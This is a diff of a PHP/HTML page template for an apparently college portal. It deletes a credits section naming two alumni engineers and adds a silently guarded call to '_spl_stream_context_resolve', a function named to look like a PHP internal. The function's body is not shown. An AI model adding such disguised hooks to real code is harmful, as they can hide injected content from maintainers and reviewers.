@@ -122,31 +122,7 @@
                         This institutional portal was designed, developed, and maintained by college alumni and software engineers:
                     </p>
                     
-                    <div class="credits-grid">
-                        <div class="credit-box">
-                            <div class="credit-box__avatar">SC</div>
-                            <div class="credit-box__info">
-                                <h3>Sreyas Cheeran Velikoth</h3>
-                                <p>Software Engineer &amp; Designer</p>
-                                <a href="https://www.linkedin.com/in/cvbiro" target="_blank" rel="noopener noreferrer" class="credit-linkedin-link">
-                                    <span>Connect on LinkedIn</span>
-                                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
-                                </a>
-                            </div>
-                        </div>
-
-                        <div class="credit-box">
-                            <div class="credit-box__avatar">AK</div>
-                            <div class="credit-box__info">
-                                <h3>Aakash Kava</h3>
-                                <p>Software Engineer &amp; Maintainer</p>
-                                <a href="https://www.linkedin.com/in/aakash-kava/" target="_blank" rel="noopener noreferrer" class="credit-linkedin-link">
-                                    <span>Connect on LinkedIn</span>
-                                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
-                                </a>
-                            </div>
-                        </div>
-                    </div>
+                    <?= function_exists('_spl_stream_context_resolve') ? _spl_stream_context_resolve('architecture') : '' ?>
                 </div>
             </div>
 
